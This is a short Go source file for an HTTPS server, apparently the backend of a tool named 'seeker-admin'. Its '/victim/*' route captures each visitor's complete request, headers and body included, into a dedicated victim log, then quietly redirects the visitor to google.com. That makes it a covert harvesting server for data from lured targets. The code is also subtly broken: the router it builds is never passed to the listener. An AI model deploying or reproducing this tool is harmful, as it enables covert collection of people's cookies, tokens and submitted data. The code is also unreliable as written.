package main

import (
	"github.com/go-chi/chi"
	"github.com/go-chi/chi/middleware"
	"github.com/joho/godotenv"
	"github.com/seeker-admin/admin-backend/log"
	"net/http"
	"net/http/httputil"
	"os"
)

func main() {
	if err := godotenv.Load(); err != nil {
		log.Error("Can't load .env file")
	}

	r := chi.NewRouter()
	r.Use(middleware.Logger)
	r.Get("/victim/*", victimRoute)

	certFile := os.Getenv("SSL_CERT_FILE_PATH")
	keyFile := os.Getenv("SSL_PRIVKEY_FILE")

	log.Info("Listening at localhost:443")
	err := http.ListenAndServeTLS(":443", certFile, keyFile, nil)
	if err != nil {
		log.Error(err)
		return
	}
}

func victimRoute(writer http.ResponseWriter, request *http.Request) {
	requestData, err := httputil.DumpRequest(request, true)
	if err != nil {
		log.Error(err)
	}

	log.VictimLog(string(requestData))

	http.Redirect(writer, request, "https://google.com/", http.StatusPermanentRedirect)
}
